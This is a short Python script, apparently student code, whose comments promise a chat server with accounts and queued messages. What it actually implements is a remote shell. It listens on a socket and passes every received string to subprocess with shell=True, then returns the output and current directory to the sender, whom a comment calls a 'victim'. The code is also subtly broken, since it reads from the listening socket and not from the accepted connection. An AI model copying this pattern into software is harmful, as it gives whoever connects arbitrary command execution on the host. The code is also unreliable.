import socket
import sys
import os
import subprocess


# Create a Socket ( connect two computers)
def create_socket():
    try:
        global host
        global port
        global s
        host = "10.250.64.198"
        port = 9998
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the Port: " + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()


# Establish connection with a client (socket must be listening)
def socket_accept():
    conn, address = s.accept()
    print("Connection has been established! |" + " IP " + address[0] + " | Port" + str(address[1]))
    receive_commands(conn)
    conn.close()

# Send commands to client/victim or a friend
def receive_commands(conn):
    # TODO: Edit this so that user can create account, and the other stuff.
    while True:
        data = s.recv(1024)

        # allow client to 1. create an account and supply a unique user name

        # allow client to list accounts by text wildcard

        # allow client to send a message to a recipient, and queue if the recipient isn't logged in

        # server delivers undelivered messages to a particular user if they logged in

        # allow client to delete an account

        # make sure there isn't cd
        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[3:].decode("utf-8"))

        if len(data) > 0:
            cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            output_byte = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_byte,"utf-8")
            currentWD = os.getcwd() + "> "
            s.send(str.encode(output_str + currentWD))

            print(output_str)


def main():
    create_socket()
    bind_socket()
    socket_accept()


main()